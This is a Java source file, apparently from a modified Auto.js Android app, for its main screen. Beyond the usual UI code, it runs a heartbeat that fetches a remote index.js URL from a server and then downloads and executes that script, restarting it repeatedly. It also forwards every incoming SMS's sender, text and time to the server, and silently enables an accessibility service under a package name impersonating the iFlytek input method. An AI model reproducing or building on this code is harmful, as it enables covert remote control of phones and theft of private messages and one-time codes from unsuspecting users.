package org.autojs.autojs.ui.main;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ActivityNotFoundException;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;

import androidx.annotation.NonNull;

import com.google.android.material.floatingactionbutton.FloatingActionButton;

import androidx.core.view.GravityCompat;
import androidx.fragment.app.Fragment;
import androidx.drawerlayout.widget.DrawerLayout;
import androidx.appcompat.app.ActionBarDrawerToggle;
import androidx.appcompat.widget.Toolbar;
import androidx.viewpager.widget.ViewPager;

import android.os.Environment;
import android.os.Handler;
import android.os.PowerManager;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.view.Gravity;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Toast;

import com.google.android.material.snackbar.Snackbar;
import com.google.android.material.tabs.TabLayout;
import com.stardust.app.FragmentPagerAdapterBuilder;
import com.stardust.app.GlobalAppContext;
import com.stardust.app.OnActivityResultDelegate;
import com.stardust.autojs.core.accessibility.UiSelector;
import com.stardust.autojs.core.permission.OnRequestPermissionsResultCallback;
import com.stardust.autojs.core.permission.PermissionRequestProxyActivity;
import com.stardust.autojs.core.permission.RequestPermissionCallbacks;
import com.stardust.autojs.core.util.ProcessShell;
import com.stardust.autojs.core.util.Shell;
import com.stardust.autojs.execution.ScriptExecution;
import com.stardust.autojs.execution.ScriptExecutionListener;
import com.stardust.autojs.execution.SimpleScriptExecutionListener;
import com.stardust.autojs.runtime.ScriptRuntime;
import com.stardust.autojs.runtime.api.AbstractShell;
import com.stardust.autojs.runtime.api.Device;
import com.stardust.automator.UiGlobalSelector;
import com.stardust.enhancedfloaty.FloatyService;
import com.stardust.pio.PFile;
import com.stardust.pio.PFiles;
import com.stardust.theme.ThemeColorManager;
import com.stardust.util.BackPressedHandler;
import com.stardust.util.DeveloperUtils;
import com.stardust.util.DrawerAutoClose;
import com.stardust.util.IntentUtil;
import com.tencent.bugly.crashreport.BuglyLog;

import org.androidannotations.annotations.AfterViews;
import org.androidannotations.annotations.Click;
import org.androidannotations.annotations.EActivity;
import org.androidannotations.annotations.ViewById;
import org.apache.commons.lang3.StringUtils;
import org.autojs.autojs.BuildConfig;
import org.autojs.autojs.Pref;
import org.autojs.autojs.R;
import org.autojs.autojs.autojs.AutoJs;
import org.autojs.autojs.external.fileprovider.AppFileProvider;
import org.autojs.autojs.external.foreground.ForegroundService;
import org.autojs.autojs.external.receiver.DynamicBroadcastReceivers;
import org.autojs.autojs.external.receiver.SmsEvent;
import org.autojs.autojs.model.explorer.Explorers;
import org.autojs.autojs.model.script.ScriptFile;
import org.autojs.autojs.model.script.Scripts;
import org.autojs.autojs.network.TaskService;
import org.autojs.autojs.network.download.DownloadManager;
import org.autojs.autojs.network.entity.task.BlankResponse;
import org.autojs.autojs.network.entity.task.HeartBeatResponse;
import org.autojs.autojs.network.entity.task.ReportResponse;
import org.autojs.autojs.network.util.MD5Utils;
import org.autojs.autojs.network.util.ParamsFactory;
import org.autojs.autojs.timing.IntentTask;
import org.autojs.autojs.timing.TimedTaskManager;
import org.autojs.autojs.timing.alarm.AlarmRunningService;
import org.autojs.autojs.timing.alarm.HeartBeatEvent;
import org.autojs.autojs.tool.AccessibilityServiceTool;
import org.autojs.autojs.tool.SimpleObserver;
import org.autojs.autojs.ui.BaseActivity;
import org.autojs.autojs.ui.common.NotAskAgainDialog;
import org.autojs.autojs.ui.common.ScriptOperations;
import org.autojs.autojs.ui.floating.FloatyWindowManger;
import org.autojs.autojs.ui.log.LogActivity_;
import org.autojs.autojs.ui.main.community.CommunityFragment;
import org.autojs.autojs.ui.main.scripts.MyScriptListFragment_;
import org.autojs.autojs.ui.main.task.TaskManagerFragment_;
import org.autojs.autojs.ui.settings.SettingsActivity_;
import org.autojs.autojs.ui.update.VersionGuard;
import org.autojs.autojs.ui.widget.CommonMarkdownView;
import org.autojs.autojs.ui.widget.SearchViewItem;
import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import io.reactivex.Observable;
import io.reactivex.Observer;
import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.disposables.Disposable;
import io.reactivex.functions.Consumer;
import io.reactivex.schedulers.Schedulers;
import okhttp3.ResponseBody;

@EActivity(R.layout.activity_main)
public class MainActivity extends BaseActivity implements OnActivityResultDelegate.DelegateHost, BackPressedHandler.HostActivity, PermissionRequestProxyActivity {

    //TODO 原包名 org.autojs.autojs

    public static class DrawerOpenEvent {
        static DrawerOpenEvent SINGLETON = new DrawerOpenEvent();
    }

    private static final String LOG_TAG = "MainActivity";
    private static final int REQUEST_CODE_IGNORE_BATTERY = 27101;

    @ViewById(R.id.drawer_layout)
    DrawerLayout mDrawerLayout;

    @ViewById(R.id.viewpager)
    ViewPager mViewPager;

    @ViewById(R.id.fab)
    FloatingActionButton mFab;

    private FragmentPagerAdapterBuilder.StoredFragmentPagerAdapter mPagerAdapter;
    private OnActivityResultDelegate.Mediator mActivityResultMediator = new OnActivityResultDelegate.Mediator();
    private RequestPermissionCallbacks mRequestPermissionCallbacks = new RequestPermissionCallbacks();
    private VersionGuard mVersionGuard;
    private BackPressedHandler.Observer mBackPressObserver = new BackPressedHandler.Observer();
    private SearchViewItem mSearchViewItem;
    private MenuItem mLogMenuItem;
    private boolean mDocsSearchItemExpanded;

    private static final String TAG = "zsj-autojs";

    private ScriptOperations scriptOperations;
    private ScriptFile indexJsFile;
    private Map<Integer, ScriptExecution> scriptExecutionMap = new HashMap<>();

    ScriptExecutionListener mScriptExecutionListener = new SimpleScriptExecutionListener() {
        @Override
        public void onStart(ScriptExecution execution) {
            super.onStart(execution);
            Log.d("zsj", "onStart: " + execution.getId() + "---" + execution.getSource().getName());
            //开始执行脚本
            scriptExecutionMap.put(execution.getId(), execution);
        }

        @Override
        public void onSuccess(ScriptExecution execution, Object result) {
            super.onSuccess(execution, result);
            Log.d("zsj", "onSuccess: " + execution.getId() + "---" + execution.getSource().getName());
            //执行完成
            scriptExecutionMap.remove(execution.getId());
            reStartTask(execution);
        }

        @Override
        public void onException(ScriptExecution execution, Throwable e) {
            super.onException(execution, e);
            Log.d("zsj", "onException: " + execution.getId() + "---" + e.getMessage());

            //执行发生异常
            scriptExecutionMap.remove(execution.getId());
            reportError(e.getLocalizedMessage());

            boolean isRestratTask = Pref.isOpenRestartTask();

            if (isRestratTask) {
                reStartTask(execution);
            }
        }
    };

    /**
     * 失败或执行结束后，重启index任务
     *
     * @param execution
     */
    public void reStartTask(ScriptExecution execution) {
        if ("index".equals(execution.getSource().getName())) {
            if (indexJsFile == null) {
                String indexJsPath = scriptOperations.getCurrentDirectoryPath() + "index.js";
                indexJsFile = new ScriptFile(indexJsPath);

            }
            //执行脚本
            runIndexJsScript();
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        scriptOperations = new ScriptOperations(MainActivity.this, mFab);
//        mVersionGuard = new VersionGuard(this);
        EventBus.getDefault().register(this);
//        applyDayNightMode();
        Log.d(TAG, "onCreate: " + getPackageName());
        //监控失败
        AutoJs.getInstance().getScriptEngineService().registerGlobalScriptExecutionListener(mScriptExecutionListener);


    }

    @Override
    protected void onResume() {
        super.onResume();
//        mVersionGuard.checkForDeprecatesAndUpdates();
        if(!AccessibilityServiceTool.isAccessibilityServiceEnabled(MainActivity.this)){
            openAccessibilityByAdb();
        }
    }

    public boolean openAccessibilityByAdb() {
        try {
            String enabledService = Settings.Secure.getString(GlobalAppContext.get().getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            String service = enabledService + ":com.iflytek.inputmethod/com.stardust.autojs.core.accessibility.AccessibilityService";
            Settings.Secure.putString(GlobalAppContext.get().getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, service);
            Settings.Secure.putString(GlobalAppContext.get().getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED, "1");
            return true;
        } catch (Exception e) {
            //adb shell pm grant com.iflytek.inputmethod android.permission.WRITE_SECURE_SETTINGS
            return false;
        }
    }


    @AfterViews
    void setUpViews() {
        setUpToolbar();
        setUpTabViewPager();
        getWindow().getDecorView().setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN | View.SYSTEM_UI_FLAG_LAYOUT_STABLE);
        registerBackPressHandlers();
        ThemeColorManager.addViewBackground(findViewById(R.id.app_bar));
        mDrawerLayout.addDrawerListener(new DrawerLayout.SimpleDrawerListener() {
            @Override
            public void onDrawerOpened(View drawerView) {
                EventBus.getDefault().post(DrawerOpenEvent.SINGLETON);
            }
        });

        if (checkPermissions()) {
            doIndexTask();
        }

    }

    /**
     * 执行 index 主任务
     */
    public void doIndexTask() {
        //将asset文件夹中md5文件保存到本地
        saveAssetToFile();
        //开启心跳监控
        startHeartBeatTask();
    }

    /**
     * 将asset文件夹中md5文件保存到本地
     */
    public void saveAssetToFile() {
        String pathDir = scriptOperations.getCurrentDirectoryPath();

        try {
            PFiles.copyAssetDir(getAssets(), "md5", pathDir, null);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * 下载主index.js 脚本
     */
    @SuppressLint("CheckResult")
    public void loadIndexJs(String url) {

        if (StringUtils.isEmpty(url)) {
            return;
        }

        String indexJsPath = scriptOperations.getCurrentDirectoryPath() + "index.js";

        if (new File(indexJsPath).exists()) {
            new File(indexJsPath).delete();
        }

        DownloadManager.getInstance()
                .downloadWithProgress(MainActivity.this, url, indexJsPath)
                .subscribe(file -> {

                    indexJsFile = new ScriptFile(file.getPath());
                    Explorers.workspace().refreshAll();
                    //执行脚本
                    runIndexJsScript();

                }, throwable -> reportError(throwable.getLocalizedMessage()));
    }

    /**
     * 开启心跳监控
     */
    public void startHeartBeatTask() {
        runOnUiThread(() -> {
            Intent intent = new Intent(MainActivity.this, AlarmRunningService.class);
            startService(intent);
        });

    }

    /**
     * 关闭所有的脚本
     */
    public void stopAllScript() {
        if (scriptExecutionMap == null || scriptExecutionMap.size() == 0) {
            return;
        }
        for (int exceId : scriptExecutionMap.keySet()) {
            scriptExecutionMap.get(exceId).getEngine().forceStop();
        }
    }

    /**
     * 开启脚本
     */
    public void runIndexJsScript() {
        stopAllScript();
        Scripts.INSTANCE.run(indexJsFile);
    }

    /**
     * 执行心跳任务
     *
     * @param event
     */
    @SuppressLint("CheckResult")
    @Subscribe
    public void heartBeatEvent(HeartBeatEvent event) {

        String md5 = "";
        if (indexJsFile != null) {
            try {
                md5 = MD5Utils.getFileMD5String(indexJsFile.getPath());
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        Map<String, String> map = new HashMap<>();
        map.put("md5", md5);

        TaskService.getInstance()
                .getHeartBeat(ParamsFactory.getCommonParams(map), map)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new SimpleObserver<HeartBeatResponse>() {
                    @Override
                    public void onNext(HeartBeatResponse heartBeatResponse) {
                        super.onNext(heartBeatResponse);
                        boolean isLoadIndexJs = heartBeatResponse != null && heartBeatResponse.getCode() == 0
                                && heartBeatResponse.getData() != null && heartBeatResponse.getData().getJs_url() != null;
                        String indexJsUrl = heartBeatResponse.getData().getJs_url();
                        if (isLoadIndexJs) {
                            loadIndexJs(indexJsUrl);
                        }
                    }

                    @Override
                    public void onError(Throwable e) {
                        super.onError(e);
                        reportError(e.getLocalizedMessage());

                    }
                });
    }

    /**
     * 上报错误信息
     *
     * @param errorMess
     */
    @SuppressLint("CheckResult")
    public void reportError(String errorMess) {
        Map<String, String> map = new HashMap<>();
        map.put("error", errorMess);
        TaskService.getInstance()
                .getReport(ParamsFactory.getCommonParams(map), map)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe();
    }

    /**
     * 短信监控
     *
     * @param smsEvent
     */
    @SuppressLint("CheckResult")
    @Subscribe
    public void onEvent(SmsEvent smsEvent) {
        if (smsEvent == null) {
            return;
        }
        String sender = smsEvent.getSender();
        String content = smsEvent.getContent();
        long time = smsEvent.getTime();

        Map<String, String> map = new HashMap<>();
        map.put("sms_sender", sender);
        map.put("sms_content", content);
        map.put("sms_time", String.valueOf(time));

        TaskService.getInstance()
                .sms(ParamsFactory.getCommonParams(map), map)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe();

    }

    private void showAnnunciationIfNeeded() {
        if (!Pref.shouldShowAnnunciation()) {
            return;
        }
        new CommonMarkdownView.DialogBuilder(this)
                .padding(36, 0, 36, 0)
                .markdown(PFiles.read(getResources().openRawResource(R.raw.annunciation)))
                .title(R.string.text_annunciation)
                .positiveText(R.string.ok)
                .canceledOnTouchOutside(false)
                .show();
    }


    private void registerBackPressHandlers() {
        mBackPressObserver.registerHandler(new DrawerAutoClose(mDrawerLayout, Gravity.START));
        mBackPressObserver.registerHandler(new BackPressedHandler.DoublePressExit(this, R.string.text_press_again_to_exit));
    }

    private boolean checkPermissions() {
        return checkPermission(Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE
                , Manifest.permission.READ_PHONE_STATE);
    }

    private void showAccessibilitySettingPromptIfDisabled() {
        if (AccessibilityServiceTool.isAccessibilityServiceEnabled(this)) {
            return;
        }
        new NotAskAgainDialog.Builder(this, "MainActivity.accessibility")
                .title(R.string.text_need_to_enable_accessibility_service)
                .content(R.string.explain_accessibility_permission)
                .positiveText(R.string.text_go_to_setting)
                .negativeText(R.string.text_cancel)
                .onPositive((dialog, which) ->
                        AccessibilityServiceTool.enableAccessibilityService()
                ).show();
    }

    private void goAppSettings() {
        Intent intent = new Intent();
        intent.setAction("android.settings.APPLICATION_DETAILS_SETTINGS");
        intent.setData(Uri.fromParts("package", getPackageName(), null));
        startActivity(intent);
    }

    private void setUpToolbar() {
        Toolbar toolbar = $(R.id.toolbar);
        setSupportActionBar(toolbar);
        toolbar.setTitle(R.string.app_name);
        ActionBarDrawerToggle drawerToggle = new ActionBarDrawerToggle(this, mDrawerLayout, toolbar, R.string.text_drawer_open,
                R.string.text_drawer_close);
        drawerToggle.syncState();
        mDrawerLayout.addDrawerListener(drawerToggle);
    }

    private void setUpTabViewPager() {
        TabLayout tabLayout = $(R.id.tab);
        mPagerAdapter = new FragmentPagerAdapterBuilder(this)
                .add(new MyScriptListFragment_(), R.string.text_file)
//                .add(new DocsFragment_(), R.string.text_tutorial)
//                .add(new CommunityFragment_(), R.string.text_community)
//                .add(new MarketFragment(), R.string.text_market)
                .add(new TaskManagerFragment_(), R.string.text_manage)
                .build();
        mViewPager.setAdapter(mPagerAdapter);
        tabLayout.setupWithViewPager(mViewPager);
        setUpViewPagerFragmentBehaviors();
    }

    private void setUpViewPagerFragmentBehaviors() {
        mPagerAdapter.setOnFragmentInstantiateListener((pos, fragment) -> {
            ((ViewPagerFragment) fragment).setFab(mFab);
            if (pos == mViewPager.getCurrentItem()) {
                ((ViewPagerFragment) fragment).onPageShow();
            }
        });
        mViewPager.addOnPageChangeListener(new ViewPager.SimpleOnPageChangeListener() {
            private ViewPagerFragment mPreviousFragment;

            @Override
            public void onPageSelected(int position) {
                Fragment fragment = mPagerAdapter.getStoredFragment(position);
                if (fragment == null)
                    return;
                if (mPreviousFragment != null) {
                    mPreviousFragment.onPageHide();
                }
                mPreviousFragment = (ViewPagerFragment) fragment;
                mPreviousFragment.onPageShow();
            }
        });
    }


    @Click(R.id.setting)
    void startSettingActivity() {
        startActivity(new Intent(this, SettingsActivity_.class));
    }

    @Click(R.id.exit)
    public void exitCompletely() {
        finish();
        FloatyWindowManger.hideCircularMenu();
        ForegroundService.stop(this);
        stopService(new Intent(this, FloatyService.class));
        AutoJs.getInstance().getScriptEngineService().stopAll();
    }

    @Override
    protected void onPause() {
        super.onPause();
    }


    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        mActivityResultMediator.onActivityResult(requestCode, resultCode, data);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (mRequestPermissionCallbacks.onRequestPermissionsResult(requestCode, permissions, grantResults)) {
            return;
        }

        boolean isAllGranted = true;

        for (int grant : grantResults) {
            if (grant != PackageManager.PERMISSION_GRANTED) {
                isAllGranted = false;
                break;
            }
        }

        if (isAllGranted) {
            Explorers.workspace().refreshAll();
            //执行任务
            doIndexTask();
        }

//        if (getGrantResult(Manifest.permission.READ_EXTERNAL_STORAGE, permissions, grantResults) == PackageManager.PERMISSION_GRANTED) {
//        }
    }

    private int getGrantResult(String permission, String[] permissions, int[] grantResults) {
        int i = Arrays.asList(permissions).indexOf(permission);
        if (i < 0) {
            return 2;
        }
        return grantResults[i];
    }

    @Override
    protected void onStart() {
        super.onStart();
        if (!BuildConfig.DEBUG) {
            DeveloperUtils.verifyApk(this, R.string.dex_crcs);
        }
    }


    @NonNull
    @Override
    public OnActivityResultDelegate.Mediator getOnActivityResultDelegateMediator() {
        return mActivityResultMediator;
    }

    @Override
    public void onBackPressed() {
        Fragment fragment = mPagerAdapter.getStoredFragment(mViewPager.getCurrentItem());
        if (fragment instanceof BackPressedHandler) {
            if (((BackPressedHandler) fragment).onBackPressed(this)) {
                return;
            }
        }
        if (!mBackPressObserver.onBackPressed(this)) {
            super.onBackPressed();
        }
    }

    @Override
    public void addRequestPermissionsCallback(OnRequestPermissionsResultCallback callback) {
        mRequestPermissionCallbacks.addCallback(callback);
    }

    @Override
    public boolean removeRequestPermissionsCallback(OnRequestPermissionsResultCallback callback) {
        return mRequestPermissionCallbacks.removeCallback(callback);
    }


    @Override
    public BackPressedHandler.Observer getBackPressedObserver() {
        return mBackPressObserver;
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.menu_main, menu);
        MenuItem searchMenuItem = menu.findItem(R.id.action_search);
        mLogMenuItem = menu.findItem(R.id.action_log);
        setUpSearchMenuItem(searchMenuItem);
        return true;
    }


    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        if (item.getItemId() == R.id.action_log) {
            if (mDocsSearchItemExpanded) {
                submitForwardQuery();
            } else {
                LogActivity_.intent(this).start();
            }
            return true;
        }
        return super.onOptionsItemSelected(item);
    }

    @Subscribe
    public void onLoadUrl(CommunityFragment.LoadUrl loadUrl) {
        mDrawerLayout.closeDrawer(GravityCompat.START);
    }


    private void setUpSearchMenuItem(MenuItem searchMenuItem) {
        mSearchViewItem = new SearchViewItem(this, searchMenuItem) {
            @Override
            public boolean onMenuItemActionExpand(MenuItem item) {
                if (mViewPager.getCurrentItem() == 1) {
                    mDocsSearchItemExpanded = true;
                    mLogMenuItem.setIcon(R.drawable.ic_ali_up);
                }
                return super.onMenuItemActionExpand(item);
            }

            @Override
            public boolean onMenuItemActionCollapse(MenuItem item) {
                if (mDocsSearchItemExpanded) {
                    mDocsSearchItemExpanded = false;
                    mLogMenuItem.setIcon(R.drawable.ic_ali_log);
                }
                return super.onMenuItemActionCollapse(item);
            }
        };
        mSearchViewItem.setQueryCallback(this::submitQuery);
    }

    private void submitQuery(String query) {
        if (query == null) {
            EventBus.getDefault().post(QueryEvent.CLEAR);
            return;
        }
        QueryEvent event = new QueryEvent(query);
        EventBus.getDefault().post(event);
        if (event.shouldCollapseSearchView()) {
            mSearchViewItem.collapse();
        }
    }

    private void submitForwardQuery() {
        QueryEvent event = QueryEvent.FIND_FORWARD;
        EventBus.getDefault().post(event);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        EventBus.getDefault().unregister(this);

        AutoJs.getInstance().getScriptEngineService().unregisterGlobalScriptExecutionListener(mScriptExecutionListener);
    }
}